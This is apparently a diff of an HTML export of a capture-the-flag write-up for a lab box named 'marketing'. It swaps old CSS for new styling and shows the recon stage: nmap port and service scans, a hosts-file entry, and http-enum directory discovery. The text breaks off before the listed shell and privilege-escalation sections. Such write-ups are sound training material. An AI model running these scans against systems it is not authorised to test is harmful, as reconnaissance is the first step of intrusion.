-  background-color: inherit;
-}
-
-.md-diagram-panel {
-  margin-top: 8px;
-}
-
-.file-list-item-file-name {
-  font-weight: initial;
-}
-
-.file-list-item-summary {
-  opacity: 1;
-}
-
-.file-list-item {
-  color: #777;
-}
-
-.file-list-item.active {
-  background-color: inherit;
-  color: black;
-}
-
-.ty-side-sort-btn.active {
-  background-color: inherit;
-}
-
-.file-list-item.active .file-list-item-file-name {
-  font-weight: bold;
-}
-
-.file-list-item {
-  opacity: 1 !important;
-}
-
-.file-library-node.active > .file-node-background {
-  background-color: rgba(32, 43, 51, 0.63);
-  background-color: var(--active-file-bg-color);
-}
-
-.file-tree-node.active > .file-node-content {
-  color: white;
-  color: var(--active-file-text-color);
-}
-
-.md-task-list-item > input {
-  margin-left: -1.7em;
-  margin-top: calc(1rem - 12px);
-  -webkit-appearance: button;
-}
-
-input {
-  border: 1px solid #aaa;
-}
-
-.megamenu-menu-header #megamenu-menu-header-title,
-.megamenu-menu-header:hover,
-.megamenu-menu-header:focus {
-  color: inherit;
-}
-
-.dropdown-menu .divider {
-  border-color: #e5e5e5;
-  opacity: 1;
-}
-
-/* https://github.com/typora/typora-issues/issues/2046 */
-.os-windows-7 strong,
-.os-windows-7 strong {
-  font-weight: 760;
-}
-
-.ty-preferences .btn-default {
-  background: transparent;
-}
-
-.ty-preferences .window-header {
-  border-bottom: 1px dashed #202b33;
-  box-shadow: none;
-}
-
-#sidebar-loading-template,
-#sidebar-loading-template.file-list-item {
-  color: #777;
-}
-
-.searchpanel-search-option-btn.active {
-  background: #777;
-  color: white;
-}
-
-.export-detail,
-.light .export-detail,
-.light .export-item.active,
-.light .export-items-list-control {
-  background: #e0e0e0;
-  border-radius: 2px;
-  font-weight: 700;
-  color: inherit;
-}
-</style>
-<style type='text/css'  id="style-lp">ol, ul {padding-left: 40px}</style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
 <title>marketing</title>
+<style>
+:root {
+    --bg: #fdfbf7;
+    --text: #262220;
+    --muted: #7a736a;
+    --link: #0f5fae;
+    --border: #e7e1d6;
+    --code-bg: #eef3f8;
+    --code-border: #d3e1ee;
+    --code-text: #1f2937;
+    --code-accent: #2563eb;
+    --inline-code-bg: #eef3f8;
+    --inline-code-text: #a3271e;
+}
+
+* { box-sizing: border-box; }
+
+body {
+    font-family: "Nunito", "Apple SD Gothic Neo", "Malgun Gothic", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    margin: 0;
+    padding: 56px 20px 90px;
+    line-height: 1.75;
+    font-size: 1.05rem;
+}
+
+.page {
+    max-width: 700px;
+    margin: 0 auto;
+}
+
+.byline {
+    color: var(--muted);
+    font-size: 0.85rem;
+    letter-spacing: 0.02em;
+    margin-bottom: 6px;
+}
+
+h1 {
+    font-size: 1.55rem;
+    font-weight: 700;
+    border-bottom: 2px solid var(--text);
+    padding-bottom: 16px;
+    margin: 2.4em 0 32px;
+    line-height: 1.4;
+}
+
+/* first heading on the page sits right under the byline, not floating mid-page */
+.page > h1:first-of-type { margin-top: 10px; }
+
+.tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: -18px 0 32px;
+}
+
+.tag {
+    font-size: 0.72rem;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--muted);
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    padding: 3px 11px;
+    border-radius: 999px;
+}
+
+h2, h3, h4 {
+    font-weight: 700;
+    margin-top: 2.4em;
+    margin-bottom: 0.9em;
+    line-height: 1.4;
+}
+
+h3 { font-size: 1.2rem; }
+
+blockquote {
+    margin: 1.6em 0;
+    padding: 0.3em 1.3em;
+    border-left: 4px solid var(--border);
+    color: var(--muted);
+    font-style: italic;
+}
+
+blockquote p { margin: 0.6em 0; }
+
+mark {
+    background: #fbe89f;
+    color: inherit;
+    padding: 0.05em 0.2em;
+    border-radius: 2px;
+}
+
+table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.8em 0;
+    font-size: 0.92rem;
+}
+
+th, td {
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+    vertical-align: top;
+}
+
+thead th { border-bottom: 2px solid var(--text); font-weight: 700; }
+
+/* [TOC] rendered nav */
+.toc {
+    font-size: 0.9rem;
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 8px;
+    padding: 16px 22px;
+    margin: 1.8em 0;
+}
+
+.toc ul { list-style: none; padding-left: 1.1em; margin: 0.3em 0; }
+.toc > ul { padding-left: 0; }
+.toc li { margin: 0.3em 0; }
+.toc a { color: var(--text); text-decoration: none; }
+.toc a:hover { color: var(--link); text-decoration: underline; }
+
+p { margin: 1.1em 0; }
+
+strong { font-weight: 700; }
+
+a { color: var(--link); text-decoration: underline; text-decoration-color: rgba(15, 95, 174, 0.35); text-underline-offset: 2px; }
+a:hover { text-decoration-color: currentColor; }
+
+hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2.8em 0;
+}
+
+ul, ol { padding-left: 1.5em; margin: 1.1em 0; }
+li { margin: 0.4em 0; }
+
+/* inline code */
+code {
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    background: var(--inline-code-bg);
+    color: var(--inline-code-text);
+    padding: 0.15em 0.4em;
+    border-radius: 4px;
+    font-size: 0.82em;
+    border: 1px solid var(--code-border);
+}
+
+/* fenced code blocks: light panel, not a dark box, but still clearly set apart */
+pre {
+    background: var(--code-bg);
+    color: var(--code-text);
+    border: 1px solid var(--code-border);
+    border-left: 4px solid var(--code-accent);
+    border-radius: 8px;
+    padding: 18px 20px;
+    margin: 1.8em 0;
+    overflow-x: auto;
+    box-shadow: 0 1px 3px rgba(37, 99, 235, 0.06);
+}
+
+pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    border: none;
+    font-size: 0.86rem;
+    line-height: 1.65;
+}
+
+/* images */
+img {
+    display: block;
+    max-width: 100%;
+    height: auto;
+    margin: 2em auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    box-shadow: 0 3px 10px rgba(38, 34, 32, 0.08);
+}
+
+p:has(> img:only-child) { text-align: center; }
+
+footer {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    margin-top: 64px;
+    padding-top: 22px;
+    border-top: 1px solid var(--border);
+    font-size: 0.8rem;
+    color: var(--muted);
+    text-align: center;
+}
+
+@media (max-width: 600px) {
+    body { padding: 32px 16px 64px; font-size: 1.03rem; }
+    h1 { font-size: 1.3rem; }
+}
+
+.home-link {
+    position: fixed;
+    top: 16px;
+    left: 16px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    padding: 6px 14px;
+    font-size: 0.85rem;
+    color: var(--link);
+    text-decoration: none;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+    z-index: 10;
+}
+
+.home-link:hover {
+    background: var(--row-hover, var(--code-bg));
+}
+
+@media (max-width: 600px) {
+    .home-link { top: 10px; left: 10px; padding: 5px 12px; font-size: 0.8rem; }
+}
+</style>
 </head>
-<body class='typora-export os-windows'><div class='typora-export-content'>
-<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n3"><a class="md-toc-inner" href="#recon">Recon</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n4"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n9"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n10"><a class="md-toc-inner" href="#http-80">HTTP 80</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n37"><a class="md-toc-inner" href="#shell-as-www-data">Shell as <code>www-data</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n45"><a class="md-toc-inner" href="#shell-as-tmiller">Shell as <code>t.miller</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n49"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n69"><a class="md-toc-inner" href="#shell-as-msander">Shell as <code>m.sander</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n73"><a class="md-toc-inner" href="#shell-as-root">Shell as <code>root</code></a></span></p></div><h1 id='recon'><span>Recon</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>As a standard procedure, I initiated 3 different </span><code>Nmap</code><span> scans. The first covered all 65,535 TCP ports to ensure no service was missed. The second was a targeted service scan on identified ports to determine versions, and the third focused on the top 10 UDP ports.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-27</span> <span class="cm-number">18</span>:49 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.170.225</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.051s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65533</span> closed tcp ports (reset)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp open &nbsp;<span class="cm-builtin">ssh</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">16</span>.22 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 241px;"></div><div class="CodeMirror-gutters" style="display: none; height: 241px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">22</span>,80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-27</span> <span class="cm-number">18</span>:50 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.170.225</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp open &nbsp;<span class="cm-builtin">ssh</span> &nbsp; &nbsp; OpenSSH <span class="cm-number">8</span>.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol <span class="cm-number">2</span>.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ssh-hostkey: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">3072</span> <span class="cm-number">62</span>:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">256</span> ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_ &nbsp;<span class="cm-number">256</span> <span class="cm-number">83</span>:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http &nbsp;  Apache httpd <span class="cm-number">2</span>.4.41 ((Ubuntu))</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: marketing.pg <span class="cm-attribute">-</span> Digital Marketing <span class="cm-keyword">for</span> you!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: Apache/2.4.41 (Ubuntu)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">8</span>.38 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-27</span> <span class="cm-number">18</span>:51 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.170.225</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE &nbsp; &nbsp; &nbsp; &nbsp; SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">53</span>/udp &nbsp; open|filtered domain</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">67</span>/udp &nbsp; closed &nbsp; &nbsp; &nbsp;  dhcps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">123</span>/udp  closed &nbsp; &nbsp; &nbsp;  ntp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">135</span>/udp  closed &nbsp; &nbsp; &nbsp;  msrpc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">137</span>/udp  closed &nbsp; &nbsp; &nbsp;  netbios-ns</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">138</span>/udp  closed &nbsp; &nbsp; &nbsp;  netbios-dgm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">161</span>/udp  closed &nbsp; &nbsp; &nbsp;  snmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">445</span>/udp  closed &nbsp; &nbsp; &nbsp;  microsoft-ds</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">631</span>/udp  open|filtered ipp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1434</span>/udp closed &nbsp; &nbsp; &nbsp;  ms-sql-m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">5</span>.10 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http-80'><span>HTTP 80</span></h2><p><span>I mapped the target IP address to </span><code>marketing.pg</code><span> in the </span><code>/etc/hosts</code><span> file for easier navigation.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ echo</span> <span class="cm-string">'192.168.170.225 marketing.pg'</span> | <span class="cm-builtin">sudo</span> <span class="cm-builtin">tee</span> <span class="cm-attribute">-a</span> /etc/hosts</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[sudo] password <span class="cm-keyword">for</span> kali: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192</span>.168.170.225 marketing.pg</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre><p><span>Only ports 22 and 80 were open. For the HTTP service, I ran the </span><code>http-enum</code><span> Nmap script for quick wins, which revealed </span><code>/old</code><span> and </span><code>/vendor</code><span> directories.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">--script</span><span class="cm-operator">=</span>http-enum <span class="cm-attribute">-p</span> <span class="cm-number">80</span> &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-27</span> <span class="cm-number">18</span>:52 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.170.225</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http &nbsp;  Apache httpd <span class="cm-number">2</span>.4.41 ((Ubuntu))</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: Apache/2.4.41 (Ubuntu)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| http-enum: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; /old/: Potentially interesting folder</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_  /vendor/: Potentially interesting directory w/ listing on <span class="cm-string">'apache/2.4.41 (ubuntu)'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
